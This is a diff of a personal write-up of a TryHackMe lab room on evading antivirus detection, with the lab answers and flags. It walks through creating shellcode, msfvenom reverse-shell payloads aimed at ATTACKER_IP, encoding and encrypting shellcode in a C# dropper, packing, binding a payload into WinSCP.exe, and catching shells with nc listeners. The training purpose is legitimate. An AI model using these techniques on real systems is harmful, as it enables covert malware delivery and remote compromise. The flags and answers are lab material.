@@ -2,10 +2,7 @@
 Learn shellcode encoding, packing, binders, and crypters.
 ---
 
-
 ###  Introduction 
-
-
 
 In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.
 
@@ -153,12 +150,10 @@ THM{H3ll0-W1nD0ws-Def3nd3r!}
 
 ```
 
-
 Which Antivirus software is running on the VM?
 *Windows Defender*  (the flag hello windows defender :))
 What is the name of the user account to which you have access?
 *av-victim*
-
 
 Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag?
 *THM{H3ll0-W1nD0ws-Def3nd3r!}*
@@ -229,51 +224,34 @@ The attached VM is a Windows development machine that has the tools needed to pa
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c51856efd63b36680857498bac814469.png)
 
-
 Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/78dca06d1d1e4249f25734af8082b8be.png)
 
 	Now it is time to try it out! Load the thm-intro2PE.exe file to answer the questions below. The file is located in the following location: c:\Tools\PE files\thm-intro2PE.exe.
 
-
-
 What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? 
 Check the General tab and look for the MD5 value
-![[Pasted image 20220915235516.png]]
 *530949*
 
-
-
 What is the Magic number value of the thm-intro2PE.exe file (in Hex)?
-![[Pasted image 20220915235702.png]]
 *5A4D*
 
 What is the Entry Point value of the thm-intro2PE.exe file?
 Check the Optional Header tab and look for the Entry Point value.
-![[Pasted image 20220915235816.png]]
 
 *12E4*
-
-
 
 How many Sections does the thm-intro2PE.exe file have?
 Check the File Header section (Section Count) or count them manually.
 
-![[Pasted image 20220916000021.png]]
-
 *7*
 A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section? 
 
-![[Pasted image 20220916000052.png]]
-
 *.flag*
-
 
 Check the content of the extra section. What is the flag?
 Select the Raw Address or Virtual Address value.
-
-![[Pasted image 20220916001137.png]]
 
 *THM{PE-N3w-s3ction!}*
 
@@ -365,7 +343,6 @@ THM,Rocks!
 
         
 
-
 ```
 
 ```
@@ -407,7 +384,6 @@ user@AttackBox$ objdump -d thm
 
 thm:     file format elf64-x86-64
 
-
 Disassembly of section .text:
 
 0000000000400080 <_start>:
@@ -437,9 +413,6 @@ Disassembly of section .text:
 
         
 
-
-
-
 ```
 
 Now we need to extract the hex value from the above output. To do that, we can use objcopy to dump the .text section into a new file called thm.text in a binary format as follows:
@@ -451,9 +424,7 @@ Extract the .text section
            
 user@AttackBox$ objcopy -j .text -O binary thm thm.text
 
-
 ```
-
 
 The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The xxd command has the -i option that will output the binary file in a C string directly:
 
@@ -509,8 +480,6 @@ THM,Rocks!
 Nice! it works. Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack.
 
 Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode.
-
-
 
 Modify your C program to execute the following shellcode. What is the flag?
 
@@ -675,7 +644,6 @@ public class Program {
 }
 ```
 
-
 The first part of the code will import some Windows API functions via P/Invoke. The functions we need are the following three from kernel32.dll:
 
 WinAPI Function	Description
@@ -764,7 +732,6 @@ AttackBox
 
 user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
 
-
 ```
 
 You will be asked for some information, but feel free to press enter for any requested information, as we don't need the SSL certificate to be valid. Once we have an SSL certificate, we can spawn a simple HTTPS server using python3 with the following command:
@@ -774,7 +741,6 @@ You will be asked for some information, but feel free to press enter for any req
 AttackBox
 
 user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
-
 
 ```
 
@@ -786,26 +752,18 @@ AttackBox
 
 user@AttackBox$ nc -lvp 7474
 
-
 ```
-
-
 
 Do staged payloads deliver the full content of our payload in a single package? (yea/nay)
 *nay*
 
-
 Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? (yea/nay)
 *nay*
-
 
 Is the stage0 of a staged payload in charge of downloading the final payload to be executed? (yea/nay)
 *yea*
 
-
-
 Follow the instructions to create a staged payload and upload it into the THM Antivirus Check at http://10.10.195.70/
-
 
 ```
 PS C:\Users\thm> cd "C:\Tools\CS Files"
@@ -850,7 +808,6 @@ C:\Users\thm>copy "C:\Tools\CS Files\StagedPayload.exe" \\10.11.81.220\public\
 └─$ ls
 StagedPayload.exe
 
-
 ┌──(kali㉿kali)-[~/payloads]
 └─$ cd /home/kali/asm      
                                                                                            
@@ -887,7 +844,6 @@ flagx   shellcode.bin  thm                thm.c    thm.text
 ┌──(kali㉿kali)-[~/asm]
 └─$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()" 
 <string>:1: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
-
 
 ──(kali㉿kali)-[~/share]
 └─$ ls
@@ -1035,7 +991,6 @@ AV vendors implement their AV software to blocklist most public tools (such as M
 
 Encoding and encryption can be used in AV evasion techniques where we encode and/or encrypt shellcode used in a dropper to hide it from AV software during the runtime. Also, the two techniques can be used not only to hide the shellcode but also functions, variables, etc. In this room, we mainly focus on encrypting the shellcode to evade Windows Defender.
 
-
 Is encoding shellcode only enough to evade Antivirus software? (yea/nay)
 *nay*
 
@@ -1062,7 +1017,6 @@ user@AttackBox$ msfvenom --list encoders | grep excellent
     cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
     x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
 
-
 ```
 
 We can indicate we want to use the shikata_ga_nai encoder with the -e(encoder) switch and then specify we want to encode the payload three times with the -i (iterations) switch:
@@ -1081,7 +1035,6 @@ x86/shikata_ga_nai succeeded with size 422 (iteration=2)
 x86/shikata_ga_nai chosen with final size 422
 Payload size: 422 bytes
 Final size of csharp file: 2170 bytes
-
 
 ```
 
@@ -1155,9 +1108,7 @@ Framework Encryption Formats [--encrypt <value>]
 
         
 
-
 ```
-
 
         
 
@@ -1192,7 +1143,6 @@ Generate a CSharp shellcode Format
 user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
 
         
-
 
 ```
 
@@ -1253,7 +1203,6 @@ C:\> .\Encrypter.exe
 qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
 
         
-
 
 ```
 
@@ -1328,7 +1277,6 @@ C:\> csc.exe EncStageless.cs
 
         
 
-
 ```
 
 Before running our payload, let's set up an nc listener. After copying and executing our payload into the victim machine, we should get a connection back as expected:
@@ -1348,11 +1296,9 @@ C:\Windows\System32>
 
         
 
-
 ```
 
 As you can see, simple adjustments are enough sometimes. Most of the time, any specific methods you find online won't probably work out of the box as detection signatures may already exist for them. However, using a bit of imagination to customize any method could prove enough for a successful bypass.
-
 
 Try to use this technique (combining encoding and encryption) on the THM Antivirus Check at http://10.10.195.70/. Does it bypass the installed AV software?
 
@@ -1361,12 +1307,7 @@ after copy csharp generated for msfvenom then copy the hexadecimal into encrypto
 
 PS C:\Users\thm> cd "C:\Tools\CS Files"                                                                                 PS C:\Tools\CS Files> csc.exe .\Encryptor.cs                                                                            Microsoft (R) Visual C# Compiler version 4.8.3761.0                                                                     for C# 5                                                                                                                Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                       This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240                                                                                                                                                                                                       PS C:\Tools\CS Files> .\Encryptor.exe                                                                                   qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXJg7nJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==
 
-
 ```
-
-![[Pasted image 20220916133940.png]]
-
-![[Pasted image 20220916134049.png]]
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -1404,10 +1345,7 @@ C:\Users\thm>copy "C:\Tools\CS Files\Encryptor.exe" \\10.11.81.220\public\
 C:\Users\thm>copy "C:\Tools\CS Files\EncStageless.exe" \\10.11.81.220\public\
         1 file(s) copied.
 
-
 ```
-
-![[Pasted image 20220916134659.png]]
 
 *It works! just upload EncStageLess.exe and use a reverse shell listening on port 443*
 
@@ -1435,7 +1373,6 @@ The packed version of the application will contain your packed application code.
 When your packed application gets executed, the following will happen:
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/408fb909374c2b54bebef9809eaa417a.png)
-
 
     The unpacker gets executed first, as it is the executable's entry point.
     The unpacker reads the packed application's code.
@@ -1479,7 +1416,6 @@ public class Program {
   {
     byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };
 
-
     UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
 
@@ -1502,7 +1438,6 @@ Command Prompt
 
 C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
 
-
 ```
 
 You can then compile your payload in the Windows machine using the following command:
@@ -1512,7 +1447,6 @@ You can then compile your payload in the Windows machine using the following com
 Command Prompt
 
 C:\> csc UnEncStagelessPayload.cs
-
 
 ```
 
@@ -1543,7 +1477,6 @@ The new payload should be ready and hopefully won't trigger any alarms when uplo
 AttackBox
 
 user@attackbox$ nc -lvp 7478
-
 
 ```
 
@@ -1613,10 +1546,7 @@ C:\App>whoami
 whoami
 av-evasion-pc\av-victim
 
-
 ```
-
-![[Pasted image 20220916145635.png]]
 
 So far, so good, but remember we talked about AVs doing in-memory scanning? If you try running a command on your reverse shell, the AV will notice your shell and kill it. This is because Windows Defender will hook certain Windows API calls and do in-memory scanning whenever such API calls are used. In the case of any shell generated with msfvenom, CreateProcess() will be invoked and detected.
 
@@ -1631,24 +1561,16 @@ If detection isn't an issue, you can even use a simple trick. From your reverse 
 
 While every single AV will behave differently, most of the time, there will be a similar way around them, so it's worth exploring any weird behaviors you notice while testing.
 
-
 Will packers help you obfuscate your malicious code to bypass AV solutions? (yea/nay)
 *yea*
-
-
 
 Will packers often unpack the original code in-memory before running it? (yea/nay)
 *yea*
 
-
-
 Are some packers detected as malicious by some AV solutions? (yea/nay)
 *yea*
 
-
-
 Follow the instructions to create a packed payload and upload it into the THM Antivirus Check at http://10.10.195.70/
-
 
 ### Binders 
 
@@ -1675,7 +1597,6 @@ Note: Metasploit is installed in the Windows machine for your convenience, but i
 AttackBox
 
 C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
-
 
 ```
 
@@ -1727,23 +1648,17 @@ When creating a real payload, you may want to use encoders, crypters, or packers
 
 Feel free to try and upload your bound executable to the THM Antivirus Check website (link available on your desktop) without any packing, and you should get a detection back from the server, so this method won't be of much help when trying to get the flag from the server by itself.
 
-
 Will a binder help with bypassing AV solutions? (yea/nay)
 *nay*
-
-
 
 Can a binder be used to make a payload appear as a legitimate executable? (yea/nay)
 *yea*
 
 ### Conclusion 
 
-
-
 In this room, we have explored some strategies available to an attacker to circumvent AV engines that rely on disk-based detection only. While this is just one of the mechanisms available to any modern AV engine, we should be able to at least deliver our payloads to our victim's disk as a first step. Bypassing in-memory detection and other advanced detection mechanisms are left for a future room. You may want to check the Runtime Detection Evasion for more information on bypassing further Windows security mechanisms that may prevent your payloads from triggering.
 
 Remember that the success of any encrypter, encoder or packer, will largely depend on AV engines not knowing any signatures for them. Therefore, being able to customize your own payloads is critical when trying to bypass any real-world solution.
-
 
 Click and continue learning!
 
